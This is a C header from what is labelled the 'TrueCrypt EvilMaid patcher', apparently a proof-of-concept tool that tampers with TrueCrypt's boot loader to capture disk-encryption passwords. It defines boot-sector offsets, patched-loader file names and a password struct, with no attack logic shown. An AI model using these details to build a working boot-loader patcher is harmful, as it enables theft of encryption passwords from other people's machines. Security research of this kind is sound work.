#pragma once

#define VER_STRING	"TrueCrypt EvilMaid patcher v0.1\n---------------------------------\n"

#define ALIGN(x,y)	(((x)+(y)-1)&(~((y)-1)))

#define	SECTOR_SIZE	512

#define SECTORS_TO_BACKUP	64

#define	LOADER_COMPRESSED	"loader.gz"
#define	LOADER			"loader"
#define PATCHED_LOADER		"patched"
#define PATCHED_LOADER_COMPRESSED	"patched.gz"

#define	TC_COM_EXECUTABLE_OFFSET	0x100
#define TC_BOOT_SECTOR_LOADER_LENGTH_OFFSET 432
#define TC_BOOT_SECTOR_LOADER_CHECKSUM_OFFSET 434

// TrueCrypt password.h:

// User text input limits
#define MIN_PASSWORD			1	// Minimum possible password length
#define MAX_PASSWORD			64	// Maximum possible password length

typedef struct
{
	unsigned int Length;
	unsigned char Text[MAX_PASSWORD + 1];
	char Pad[3];			  // keep 64-bit alignment
} Password;
